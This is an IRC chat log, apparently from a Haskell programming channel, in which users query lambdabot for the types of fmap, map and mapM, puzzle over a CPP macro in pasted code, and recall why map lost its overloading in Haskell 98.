23:34:07 <ac> hmm. you could be very smart about optimizing which objects to calculate intersection with
23:35:13 <ac> I wonder how long it's going to take for a video card with raytraycing abilities to show up
23:35:31 <OceanSpray> Such a card better be multi-core.
23:49:25 <hpaste>  cinimod pasted "Unfamiliar Syntax" at http://hpaste.org/6049
23:51:34 <cinimod> Bother! hpaste has truncated the bit I wanted help on.
23:53:04 <OceanSpray> :t fmap
23:53:08 <lambdabot> forall a b (f :: * -> *). (Functor f) => (a -> b) -> f a -> f b
23:53:15 <hpaste>  cinimod pasted "Unfamiliar Syntax II" at http://hpaste.org/6050
23:53:39 <OceanSpray> :t map
23:53:40 <lambdabot> forall a b. (a -> b) -> [a] -> [b]
23:53:44 <OceanSpray> well, shit.
23:53:59 <OceanSpray> how do I map an IO action over a list?
23:54:15 <yondalf> :t mapM
23:54:16 <lambdabot> forall a (m :: * -> *) b. (Monad m) => (a -> m b) -> [a] -> m [b]
23:54:22 <OceanSpray> oh, there it is.
23:54:24 <OceanSpray> thanks.
23:54:29 <yondalf> no problem
23:54:35 <oerjan> cinimod: wondering about the #?  ghc uses it for internal primitive operations
23:54:38 <cinimod> Can anyone tell me what GETHOSTWORDS(BitGet) does? It's not familiar syntax to me: http://hpaste.org/6050
23:54:46 <oerjan> oh
23:55:01 <yondalf> cinimod: i think it's an instance of the c preprocessor
23:55:02 <oerjan> maybe a cpp macro?
23:55:11 <yondalf> cinimod: otherwise i have no idea :-P
23:55:50 <yondalf> i have no idea why both fmap and map exist...why don't you just have map be a function in the Functor class?
23:55:57 <oerjan> cinimod: probably defined by #include "Common.h"
23:56:05 <cinimod> Ok I'll investigate - it's causing some obscure type errors (obscure to me at least)
23:57:10 <oerjan> @quote scare
23:57:10 <lambdabot> glguy says: map became not overloaded in the great polymorphic scare of haskell 98
23:57:20 <oerjan> yondalf: ^^
23:57:47 <yondalf> polymorphic scare?
23:57:49 <oerjan> i.e. it used to be, in haskell 1.4
23:59:48 <oerjan> a bunch of functions became less polymorphic because they wanted to spare beginners from type class error messages
